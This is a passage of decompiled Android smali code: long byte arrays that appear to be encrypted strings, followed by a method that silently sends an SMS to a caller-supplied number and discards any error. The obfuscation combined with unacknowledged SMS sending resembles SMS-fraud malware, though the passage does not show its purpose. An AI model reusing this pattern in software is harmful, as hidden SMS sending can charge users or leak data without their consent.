        -0x44t
        -0x3bt
        -0x7ct
        0x43t
        0x30t
        0x67t
        -0x5ct
        -0x75t
        -0x56t
        -0x3ct
        -0x7ct
        0x58t
        0x7at
        0x20t
        -0x4dt
        -0x65t
        -0x4bt
        -0x68t
        -0x65t
        0x42t
        0x3bt
        0x27t
        -0x5et
        -0x5ft
        -0x52t
        -0x7bt
    .end array-data

    :array_2b
    .array-data 1
        -0x15t
        0x2at
        0x54t
        0x49t
        -0x39t
        -0x2t
        -0x28t
        -0x49t
    .end array-data

    :array_2c
    .array-data 1
        0x42t
        -0x5ft
        0x2ct
        -0x7et
        -0xdt
        -0x50t
        0x47t
        -0x7et
        0x48t
        -0x56t
    .end array-data

    nop

    :array_2d
    .array-data 1
        0x21t
        -0x32t
        0x42t
        -0xat
        -0x6et
        -0x2dt
        0x33t
        -0x23t
    .end array-data

    :array_2e
    .array-data 1
        0x17t
        -0x48t
        -0x63t
        -0x3dt
        0x44t
        0x4dt
        -0x60t
        -0x2at
        0x1dt
        -0x50t
        -0x7dt
        -0x2at
    .end array-data

    :array_2f
    .array-data 1
        0x73t
        -0x2ft
        -0x12t
        -0x4dt
        0x28t
        0x2ct
        -0x27t
        -0x77t
    .end array-data

    :array_30
    .array-data 1
        -0x7t
        -0x7t
        -0x73t
        0x78t
        0x28t
    .end array-data

    nop

    :array_31
    .array-data 1
        -0x63t
        -0x68t
        -0x7t
        0x19t
        0x19t
        -0x57t
        -0x46t
        0x43t
    .end array-data

    :array_32
    .array-data 1
        -0x7at
        -0x16t
        0x41t
    .end array-data

    :array_33
    .array-data 1
        -0x58t
        -0x3ct
        0x6ft
        0x10t
        0x6et
        0x40t
        0x76t
        -0x24t
    .end array-data

    :array_34
    .array-data 1
        -0x53t
        -0x7ft
        0x7dt
        0x1at
        -0x16t
        -0x59t
        0x63t
        0xft
        -0x5bt
        -0x7ft
        0x26t
        0x5ct
        -0x55t
        -0x5at
        0x24t
        0x50t
        -0xat
        -0x7ft
        0x72t
        0x1ft
        -0x1dt
        -0x50t
        0x24t
        0x46t
        -0xct
        -0x7at
        0x6ft
        0x5ct
        -0x5et
        -0xbt
        0x24t
        0x8t
        -0x41t
        -0x32t
        0x79t
        0x5ct
        -0x4ct
        -0x9t
        0x23t
        0xft
        -0xct
        -0x71t
        0x3ct
        0x5ct
        -0x1dt
        -0x50t
        0x75t
        0xft
        -0x49t
        -0x3ct
        0x79t
        0x5ct
        -0x4ct
        -0x9t
        0x23t
        0xft
        -0xct
        -0x71t
        0x3ct
        0x5ct
        -0x18t
        -0x60t
        0x6at
        0x10t
        -0x77t
        -0x32t
        0x79t
        0xdt
        -0x3t
        -0x4ct
        0x61t
        0x19t
        -0xct
        -0x67t
        0x3et
        0x5bt
        -0x3t
        -0x9t
        0x2at
        0x5ct
        -0xct
        -0x2at
        0x6et
        0x17t
        -0x54t
        -0x11t
        0x24t
        0x59t
        -0x5bt
        -0x7ft
        0x30t
        0x5et
        -0x54t
        -0x44t
        0x68t
        0x18t
        -0x4dt
        -0x25t
        0x3et
        0x44t
        -0x54t
        -0x10t
        0x62t
        0x5et
        -0x55t
    .end array-data

    nop

    :array_35
    .array-data 1
        -0x2at
        -0x5dt
        0x1ct
        0x7et
        -0x72t
        -0x2bt
        0x6t
        0x7ct
    .end array-data

    :array_36
    .array-data 1
        -0x72t
        -0x69t
        0x40t
        -0x6at
        0x55t
        -0x68t
    .end array-data

    nop

    :array_37
    .array-data 1
        0x68t
        0xbt
        -0x16t
        0x71t
        -0x36t
        0x3dt
        -0x61t
        0x3ft
    .end array-data

    :array_38
    .array-data 1
        0x51t
        0x5dt
        -0x34t
        0x5bt
        -0x2dt
        0x1ct
        -0x20t
        0x0t
    .end array-data

    :array_39
    .array-data 1
        0x5ft
        -0x4dt
    .end array-data

    nop

    :array_3a
    .array-data 1
        0x3t
        -0x6ft
        0x1bt
        0x7dt
        -0x13t
        0x43t
        -0x21t
        -0x7t
    .end array-data

    :array_3b
    .array-data 1
        0x57t
        -0x58t
        -0x6bt
        -0x12t
        -0x4t
        0x6dt
        -0x3ft
        -0x69t
    .end array-data

    :array_3c
    .array-data 1
        0x59t
        -0x35t
    .end array-data

    nop

    :array_3d
    .array-data 1
        0x5t
        -0x17t
        -0x44t
        -0x4dt
        0xft
        -0x58t
        0x3at
        -0xat
    .end array-data
.end method

.method public static b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 6

    .line 1
    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    const/4 v2, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    move-object v1, p1

    move-object v3, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
